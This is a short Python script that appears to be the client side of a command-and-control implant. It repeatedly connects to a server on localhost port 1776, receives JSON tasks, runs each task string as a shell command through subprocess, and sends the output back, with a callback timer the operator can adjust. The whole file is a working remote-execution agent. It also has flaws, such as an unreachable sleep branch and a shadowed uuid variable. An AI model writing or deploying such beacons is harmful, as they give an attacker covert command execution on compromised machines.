import socket
import sys
import json
import time
import uuid
import subprocess

uuid = uuid.uuid4()
MsgNum = 0
sleepytime = 0

def sleepy(sleeptime):
    time.sleep(sleeptime)

def admin(todo, value=0):
    if (todo == "ChangeTimer"):
        result = "Time Changed to " + str(value) + " hours"
    elif (todo == "ViewTimer"):
        result = "Current callback time is " + str(sleepytime/60) + " hours"
    return result


def tojson(uuid, data):
    uuid = uuid + 1
    json_to_load = {"id": uuid, "name": "test",
        "Type": "response", "data": data}
    NewMsg = json.dumps(json_to_load)
    return NewMsg


def GenMsg(x):
    if (x == 0):
        NewMsgJ = '{"id": 0, "name": "test", "Type": "init"}'
        NewMsg = str.encode(NewMsgJ)
    else:
        reformat = x.split(" ")
        output = subprocess.Popen(
            reformat, stdout=subprocess.PIPE).communicate()[0]
        NewMsg = output.decode("utf-8")
    return NewMsg


Msg = GenMsg(MsgNum)


while True:
    HOST, PORT = "localhost", 1776
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        sock.sendall(Msg)
        print("Sending:     {}".format(Msg))

        received = sock.recv(1024)
        print("Recevied:    {}".format(received))
        raw_received = received.decode()
        receive = json.loads(raw_received)
        if (receive["task"] == "admin_tasker"):
            if ("value" in receive):
                MsgDraft = admin(receive["Type"], receive["value"])
                sleepytime = receive["value"]
            elif (receive["task"] == "admin_sleep"):
                sleepy(receive["value"])
            else:
                MsgDraft = admin(receive["Type"])
            MsgJson = tojson(receive["id"], MsgDraft)
            Msg = str.encode(MsgJson)
        elif (receive["task"] != "quit"):
            MsgDraft = GenMsg(receive["task"])
            MsgJson = tojson(receive["id"], MsgDraft)
            Msg = str.encode(MsgJson)
        else:
            exit()

    finally:
        sock.close()
    sleepy(sleepytime)
    continue

print("Closing...")
